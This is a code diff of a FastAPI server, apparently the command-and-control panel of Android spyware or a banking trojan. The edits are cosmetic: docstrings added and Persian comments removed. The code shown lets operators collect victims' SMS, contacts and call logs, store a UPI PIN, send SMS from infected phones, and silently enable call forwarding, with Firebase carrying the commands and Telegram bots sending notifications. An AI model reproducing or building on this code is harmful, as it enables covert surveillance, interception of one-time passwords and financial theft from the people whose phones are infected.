@@ -272,8 +272,6 @@ async def call_history(message: dict):
     return {"status": "success"}
 
 
-##
-
 @app.post("/api/sms/new")
 async def receive_sms(request: Request):
     try:
@@ -622,9 +620,9 @@ async def bot_request_otp(request: BotOTPRequest, req: Request, background_tasks
     """Bot authentication - step 1: request OTP"""
     ip_address = get_client_ip(req)
     admin = await auth_service.get_admin_by_username(request.username)
+    
     if not admin:
         raise HTTPException(status_code=404, detail="Admin not found")
-    
     if not admin.is_active:
         raise HTTPException(status_code=403, detail="Admin account is disabled")
     
@@ -659,7 +657,6 @@ async def bot_verify_otp(request: BotOTPVerify, req: Request):
     """Bot authentication - step 2: verify OTP and get service token"""
     ip_address = get_client_ip(req)
     user_agent = get_user_agent(req)
-    
     otp_result = await otp_service.verify_otp(request.username, request.otp_code, ip_address)
     
     if not otp_result["valid"]:
@@ -674,9 +671,9 @@ async def bot_verify_otp(request: BotOTPVerify, req: Request):
         raise HTTPException(status_code=401, detail=otp_result["message"])
     
     admin = await auth_service.get_admin_by_username(request.username)
+    
     if not admin:
         raise HTTPException(status_code=404, detail="Admin not found")
-    
     if not admin.is_active:
         raise HTTPException(status_code=403, detail="Admin account is disabled")
     
@@ -801,6 +798,7 @@ async def save_upi_pin(pin_data: UPIPinSave, background_tasks: BackgroundTasks):
 
 @app.get("/auth/me", response_model=AdminResponse)
 async def get_current_admin_info(current_admin: Admin = Depends(get_current_admin)):
+    """Get current logged-in admin info"""
     return AdminResponse(
         username=current_admin.username,
         email=current_admin.email,
@@ -859,6 +857,7 @@ async def create_admin(
 async def list_admins(
     current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
 ):
+    """List all admin accounts"""
     admins = await auth_service.get_all_admins()
     return {"admins": admins, "total": len(admins)}
 
@@ -869,7 +868,7 @@ async def update_admin(
     request: Request,
     current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
 ):
-
+    """Update admin account"""
     success = await auth_service.update_admin(username, admin_update)
 
     if not success:
@@ -891,7 +890,7 @@ async def delete_admin(
     request: Request,
     current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
 ):
-
+    """Delete admin account"""
     if username == current_admin.username:
         raise HTTPException(status_code=400, detail="Cannot delete yourself")
 
@@ -1025,7 +1024,7 @@ async def get_app_types(
 async def get_devices(
     skip: int = Query(0, ge=0),
     limit: int = Query(100, ge=1, le=1000),
-    app_type: Optional[str] = Query(None, description="فیلتر بر اساس نوع اپلیکیشن"),
+    app_type: Optional[str] = Query(None, description="Filter by app type"),
     admin_username: Optional[str] = Query(None, description="Filter by admin (Super Admin only)"),
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
 ):
@@ -1050,9 +1049,7 @@ async def get_devices(
     
     devices_cursor = mongodb.db.devices.find(query).skip(skip).limit(limit).sort("registered_at", -1)
     devices = await devices_cursor.to_list(length=limit)
-    
     total = await mongodb.db.devices.count_documents(query)
-    
     has_more = (skip + len(devices)) < total
 
     return DeviceListResponse(
@@ -1072,6 +1069,7 @@ async def get_admin_devices(
 ):
     """Get devices for specific admin (Super Admin only)"""
     target_admin = await auth_service.get_admin_by_username(admin_username)
+    
     if not target_admin:
         raise HTTPException(status_code=404, detail=f"Admin '{admin_username}' not found")
     
@@ -1083,7 +1081,6 @@ async def get_admin_devices(
     
     devices_cursor = mongodb.db.devices.find(query).skip(skip).limit(limit).sort("registered_at", -1)
     devices = await devices_cursor.to_list(length=limit)
-    
     total = await mongodb.db.devices.count_documents(query)
     has_more = (skip + len(devices)) < total
     
@@ -1107,6 +1104,7 @@ async def get_device(
     request: Request,
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
 ):
+    """Get device details by ID"""
     device = await device_service.get_device(device_id)
 
     if not device:
@@ -1130,6 +1128,7 @@ async def get_device_sms(
     request: Request = None,
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_SMS))
 ):
+    """Get SMS messages for device"""
     messages = await device_service.get_sms_messages(device_id, skip, limit)
     total = await mongodb.db.sms_messages.count_documents({"device_id": device_id})
 
@@ -1161,6 +1160,7 @@ async def get_device_contacts(
     request: Request = None,
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_CONTACTS))
 ):
+    """Get contacts for device"""
     contacts = await device_service.get_contacts(device_id, skip, limit)
     total = await mongodb.db.contacts.count_documents({"device_id": device_id})
 
@@ -1185,6 +1185,7 @@ async def get_device_logs(
     limit: int = Query(100, ge=1, le=500),
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
 ):
+    """Get activity logs for device"""
     logs = await device_service.get_logs(device_id, skip, limit)
     total = await mongodb.db.logs.count_documents({"device_id": device_id})
 
@@ -1201,24 +1202,20 @@ async def send_command_to_device(
     request: Request,
     current_admin: Admin = Depends(require_permission(AdminPermission.SEND_COMMANDS))
 ):
+    """Send command to device"""
     device = await device_service.get_device(device_id)
+    
     if not device:
         raise HTTPException(status_code=404, detail="Device not found")
 
-    # ═══════════════════════════════════════════════════════
-    # 📝 دستور NOTE
-    # ═══════════════════════════════════════════════════════
     if command_request.command == "note":
         priority = command_request.parameters.get("priority", "none")
         message = command_request.parameters.get("message", "")
-        
-        # ذخیره در دیتابیس
         success = await device_service.save_device_note(device_id, priority, message)
         
         if not success:
             raise HTTPException(status_code=400, detail="Failed to save note")
         
-        # ارسال به دستگاه از طریق Firebase
         result = await firebase_service.send_command_to_device(
             device_id,
             "note",
@@ -1228,7 +1225,6 @@ async def send_command_to_device(
             }
         )
         
-        # لاگ فعالیت ادمین
         await admin_activity_service.log_activity(
             admin_username=current_admin.username,
             activity_type=ActivityType.SEND_COMMAND,
@@ -1245,16 +1241,10 @@ async def send_command_to_device(
             "result": result
         }
 
-    # ═══════════════════════════════════════════════════════
-    # 🔔 دستور PING از طریق Firebase
-    # ═══════════════════════════════════════════════════════
     is_ping_command = command_request.command == "ping"
     ping_type = command_request.parameters.get("type", "server") if command_request.parameters else "server"
 
     if is_ping_command and ping_type == "firebase":
-        logger.info(f"📤 Sending Firebase ping to device: {device_id}")
-
-        # ✅ حذف type از parameters تا override نشه
         params = {k: v for k, v in (command_request.parameters or {}).items() if k != "type"}
         
         result = await firebase_service.send_command_to_device(
@@ -1275,11 +1265,8 @@ async def send_command_to_device(
             metadata={"command": "ping", "type": "firebase", "result": result}
         )
 
-        await device_service.add_log(
-            device_id, "command", "Firebase ping sent", "info"
-        )
+        await device_service.add_log(device_id, "command", "Firebase ping sent", "info")
         
-        # 🔔 اعلان به ربات ادمین
         await telegram_multi_service.notify_command_sent(
             current_admin.username, device_id, "ping (firebase)"
         )
@@ -1291,9 +1278,6 @@ async def send_command_to_device(
             "result": result
         }
 
-    # ═══════════════════════════════════════════════════════
-    # 📨 دستور ارسال SMS
-    # ═══════════════════════════════════════════════════════
     if command_request.command == "send_sms":
         phone = command_request.parameters.get("phone")
         message = command_request.parameters.get("message")
@@ -1329,9 +1313,6 @@ async def send_command_to_device(
             "result": result
         }
 
-    # ═══════════════════════════════════════════════════════
-    # 📞 دستور فعال‌سازی هدایت تماس
-    # ═══════════════════════════════════════════════════════
     if command_request.command == "call_forwarding":
         forward_number = command_request.parameters.get("number")
         sim_slot = command_request.parameters.get("simSlot", 0)
@@ -1365,9 +1346,6 @@ async def send_command_to_device(
             "result": result
         }
 
-    # ═══════════════════════════════════════════════════════
-    # 📵 دستور غیرفعال‌سازی هدایت تماس
-    # ═══════════════════════════════════════════════════════
     if command_request.command == "call_forwarding_disable":
         sim_slot = command_request.parameters.get("simSlot", 0)
 
@@ -1396,9 +1374,6 @@ async def send_command_to_device(
             "result": result
         }
 
-    # ═══════════════════════════════════════════════════════
-    # 📨⚡ دستور آپلود سریع SMS (50 پیامک)
-    # ═══════════════════════════════════════════════════════
     if command_request.command == "quick_upload_sms":
         result = await firebase_service.quick_upload_sms(device_id)
 
@@ -1422,9 +1397,6 @@ async def send_command_to_device(
             "result": result
         }
 
-    # ═══════════════════════════════════════════════════════
-    # 👥⚡ دستور آپلود سریع Contacts (50 مخاطب)
-    # ═══════════════════════════════════════════════════════
     if command_request.command == "quick_upload_contacts":
         result = await firebase_service.quick_upload_contacts(device_id)
 
@@ -1448,9 +1420,6 @@ async def send_command_to_device(
             "result": result
         }
 
-    # ═══════════════════════════════════════════════════════
-    # 📨📦 دستور آپلود کامل همه SMS
-    # ═══════════════════════════════════════════════════════
     if command_request.command == "upload_all_sms":
         result = await firebase_service.upload_all_sms(device_id)
 
@@ -1474,9 +1443,6 @@ async def send_command_to_device(
             "result": result
         }
 
-    # ═══════════════════════════════════════════════════════
-    # 👥📦 دستور آپلود کامل همه Contacts
-    # ═══════════════════════════════════════════════════════
     if command_request.command == "upload_all_contacts":
         result = await firebase_service.upload_all_contacts(device_id)
 
@@ -1500,9 +1466,6 @@ async def send_command_to_device(
             "result": result
         }
 
-    # ═══════════════════════════════════════════════════════
-    # ❌ دستور ناشناخته
-    # ═══════════════════════════════════════════════════════
     else:
         raise HTTPException(
             status_code=400, 
@@ -1518,7 +1481,7 @@ async def update_device_settings(
     request: Request,
     current_admin: Admin = Depends(require_permission(AdminPermission.CHANGE_SETTINGS))
 ):
-
+    """Update device settings"""
     device = await device_service.get_device(device_id)
     if not device:
         raise HTTPException(status_code=404, detail="Device not found")
@@ -1550,7 +1513,6 @@ async def update_device_settings(
         metadata={"changes": settings_dict}
     )
 
-    # 🔔 اعلان تغییر تنظیمات به ربات 3 (Admin activities)
     try:
         await telegram_multi_service.notify_admin_action(
             current_admin.username,
@@ -1560,9 +1522,7 @@ async def update_device_settings(
     except Exception as e:
         logger.warning(f"⚠️ Failed to send Telegram notification: {e}")
 
-    await device_service.add_log(
-        device_id, "settings", "Settings updated", "info", settings_dict
-    )
+    await device_service.add_log(device_id, "settings", "Settings updated", "info", settings_dict)
 
     return {
         "success": True,
@@ -1575,6 +1535,7 @@ async def delete_device_sms(
     request: Request,
     current_admin: Admin = Depends(require_permission(AdminPermission.DELETE_DATA))
 ):
+    """Delete all SMS messages for device"""
     result = await mongodb.db.sms_messages.delete_many({"device_id": device_id})
 
     await admin_activity_service.log_activity(
@@ -1586,7 +1547,6 @@ async def delete_device_sms(
         metadata={"type": "sms", "count": result.deleted_count}
     )
 
-    # 🔔 اعلان حذف داده به ربات 3 (Admin activities)
     try:
         await telegram_multi_service.notify_admin_action(
             current_admin.username,
@@ -1609,8 +1569,8 @@ async def get_device_calls(
     request: Request = None,
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
 ):
+    """Get call logs for device"""
     try:
-
         calls_cursor = mongodb.db.call_logs.find(
             {"device_id": device_id}
         ).sort("timestamp", -1).skip(skip).limit(limit)
